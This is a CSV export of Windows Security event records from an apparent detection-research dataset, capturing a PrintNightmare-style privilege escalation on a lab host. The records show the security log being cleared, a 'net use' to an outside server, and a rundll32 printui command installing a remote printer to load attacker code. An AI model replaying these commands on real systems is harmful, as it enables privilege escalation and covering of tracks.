RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,2183518,2021-10-08 12:56:58.8038610,1102,Info,Microsoft-Windows-Eventlog,Security,940,1040,fs01.offsec.lan,0,,Event log cleared,OFFSEC\admmig,,SID: (S-1-5-21-4230534742-2542757381-3142984815-1111),,,,,,,False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-4230534742-2542757381-3142984815-1111"",""SubjectUserName"":""admmig"",""SubjectDomainName"":""OFFSEC"",""SubjectLogonId"":""0x65B0F5DB""}}}"
2,2183519,2021-10-08 12:57:04.5040088,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6208,fs01.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x10A4,Parent PID: 0x7D8,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: -\-,,C:\Windows\System32\net.exe net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password,False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""NewProcessId"",""#text"":""0x10A4""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\net.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1937""},{""@Name"":""ProcessId"",""#text"":""0x7D8""},{""@Name"":""CommandLine"",""#text"":""net  use \\\\printnightmare.gentilkiwi.com\\ipc$ /user:gentilguest password""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
3,2183520,2021-10-08 12:57:06.7635761,4648,LogAlways,Microsoft-Windows-Security-Auditing,Security,556,7540,fs01.offsec.lan,0,,A logon was attempted using explicit credentials,OFFSEC\admmig,20.188.56.147:445,Target: OFFSEC\gentilguest,TargetServerName: printnightmare.gentilkiwi.com,PID: 0x4,TargetInfo: printnightmare.gentilkiwi.com,,,,False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""LogonGuid"",""#text"":""430ada27-e2ab-e393-2b26-48818c7968d4""},{""@Name"":""TargetUserName"",""#text"":""gentilguest""},{""@Name"":""TargetDomainName"",""#text"":""OFFSEC""},{""@Name"":""TargetLogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TargetServerName"",""#text"":""printnightmare.gentilkiwi.com""},{""@Name"":""TargetInfo"",""#text"":""printnightmare.gentilkiwi.com""},{""@Name"":""ProcessId"",""#text"":""0x4""},{""@Name"":""ProcessName""},{""@Name"":""IpAddress"",""#text"":""20.188.56.147""},{""@Name"":""IpPort"",""#text"":""445""}]}}"
4,2183521,2021-10-08 12:57:06.8690575,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6208,fs01.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x1670,Parent PID: 0x7D8,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: -\-,,"C:\Windows\System32\rundll32.exe rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer""",False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""NewProcessId"",""#text"":""0x1670""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1937""},{""@Name"":""ProcessId"",""#text"":""0x7D8""},{""@Name"":""CommandLine"",""#text"":""rundll32  printui.dll,PrintUIEntry /in /n\""\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer\""""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
5,2183522,2021-10-08 12:57:12.8425776,4690,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4756,fs01.offsec.lan,0,,,,,,,,,,,,False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""SourceHandleId"",""#text"":""0xAF8""},{""@Name"":""SourceProcessId"",""#text"":""0x678""},{""@Name"":""TargetHandleId"",""#text"":""0x1748""},{""@Name"":""TargetProcessId"",""#text"":""0x4""}]}}"
6,2183523,2021-10-08 12:57:12.8425888,4658,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4756,fs01.offsec.lan,0,,The handle to an object was closed,OFFSEC\admmig,,SID: S-1-5-21-4230534742-2542757381-3142984815-1111,ObjectServer: Security,HandleId: 0x1748,,,,C:\Windows\System32\spoolsv.exe (PID: 0x678),False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""HandleId"",""#text"":""0x1748""},{""@Name"":""ProcessId"",""#text"":""0x678""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\spoolsv.exe""}]}}"
7,2183524,2021-10-08 12:57:12.8426261,4656,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4756,fs01.offsec.lan,0,,A handle to an object was requested,OFFSEC\admmig,,ObjectType: File,ObjectName: C:\Windows\INF\TAPISRV\0409,HandleId: 0xAF8,TransactionId: 00000000-0000-0000-0000-000000000000,"AccessList: Unknown code (%%1541, %%4416, )",PrivilegeList: -,C:\Windows\System32\spoolsv.exe (PID: 0x678),False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""File""},{""@Name"":""ObjectName"",""#text"":""C:\\Windows\\INF\\TAPISRV\\0409""},{""@Name"":""HandleId"",""#text"":""0xAF8""},{""@Name"":""TransactionId"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""AccessList"",""#text"":""%%1541, %%4416, ""},{""@Name"":""AccessReason"",""#text"":""%%1541:, %%1801, D:(A;;0x1200a9;;;BA), %%4416:, %%1801, D:(A;;0x1200a9;;;BA), ""},{""@Name"":""AccessMask"",""#text"":""0x100001""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""RestrictedSidCount"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x678""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\spoolsv.exe""},{""@Name"":""ResourceAttributes"",""#text"":""-""}]}}"
8,2183525,2021-10-08 12:57:12.8426513,4658,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4756,fs01.offsec.lan,0,,The handle to an object was closed,OFFSEC\admmig,,SID: S-1-5-21-4230534742-2542757381-3142984815-1111,ObjectServer: Security,HandleId: 0xAF8,,,,C:\Windows\System32\spoolsv.exe (PID: 0x678),False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""HandleId"",""#text"":""0xAF8""},{""@Name"":""ProcessId"",""#text"":""0x678""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\spoolsv.exe""}]}}"
9,2183526,2021-10-08 12:57:12.8426946,4690,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4756,fs01.offsec.lan,0,,,,,,,,,,,,False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""SourceHandleId"",""#text"":""0xAF8""},{""@Name"":""SourceProcessId"",""#text"":""0x678""},{""@Name"":""TargetHandleId"",""#text"":""0x1748""},{""@Name"":""TargetProcessId"",""#text"":""0x4""}]}}"
10,2183527,2021-10-08 12:57:12.8427002,4658,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4756,fs01.offsec.lan,0,,The handle to an object was closed,OFFSEC\admmig,,SID: S-1-5-21-4230534742-2542757381-3142984815-1111,ObjectServer: Security,HandleId: 0x1748,,,,C:\Windows\System32\spoolsv.exe (PID: 0x678),False,"EVTX-to-MITRE-Attack\TA0004-Privilege Escalation\T1574-DLL side-loading\ID4688,6416,4648-SystemNightMare.evtx",Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x65B0F5DB""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""HandleId"",""#text"":""0x1748""},{""@Name"":""ProcessId"",""#text"":""0x678""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\spoolsv.exe""}]}}"
